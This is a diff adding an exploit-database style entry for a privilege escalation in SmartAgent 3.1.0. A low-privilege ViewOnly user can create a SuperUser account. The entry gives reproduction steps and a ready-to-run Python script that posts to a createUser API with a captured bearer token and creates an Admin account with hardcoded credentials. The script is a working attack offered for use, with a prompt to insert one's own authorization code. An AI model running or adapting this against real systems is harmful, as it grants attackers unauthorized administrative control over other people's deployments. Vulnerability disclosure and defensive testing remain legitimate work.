@@ -1,0 +1,32 @@
+# Exploit Title: SmartAgent 3.1.0 - Privilege Escalation
+# Date: 01-11-2021
+# Exploit Author: Orion Hridoy
+# Vendor Homepage: https://www.smartagent.io/
+# Version: Build 3.1.0
+# Tested on: Windows 10/Kali Linux
+
+A Low grade user like ViewOnly can create an account with SuperUser
+permission.
+
+Steps To Reproduce:
+1. Create a user with ViewOnly
+2. Visit https://demo.localhost.com/#/CampaignManager/users
+3. Now you will be able to create an account with SuperUser.
+
+#Python Exploit [Replace With Your Authorization Code]
+
+import requests
+
+session = requests.Session()
+
+rawBody = "{\"username\":\"orion@hridoy.com
+\",\"password\":\"Orionhridoy69\",\"appName\":\"AppEngage\",\"role\":\"Admin\",\"android\":\"1\",\"ios\":\"0\",\"kai\":\"0\"}"
+headers = {"Authorization":"id=orion@gmail.com,engageToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJvcmlvbkBnbWFpbC5jb20iLCJyb2xlcyI6WyJWaWV3T25seSJdLCJhcHBOYW1lIjoiQXBwRW5nYWdlIiwicGxhdGZvcm0iOiJBTkRST0lEIiwiaXNzIjoiRU5BR0FHRSIsImlhdCI6MTYxMDM3NDEyMCwiZXhwIjoxNjExMjM4MTIwfQ.SbnZaRe3-2GOFOm7QDzvIBQCKBAK_GV-wKsMoH4GGChyjUFe2Ij4LiVl5rXsWRfTqNnJXj9fFxYTzkD2-kXlAQ","Accept":"application/json,
+text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+rv:52.0) Gecko/20100101
+Firefox/52.0","Referer":"https://demo.localhost.com/","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip,
+deflate","DNT":"1","Content-Type":"application/json"}
+response = session.post("https://demo.localhost.com/api/createUser",
+data=rawBody, headers=headers)
+
+print("User Created With\nUser: orion@hridoy.com\nPass: Orionhridoy69")
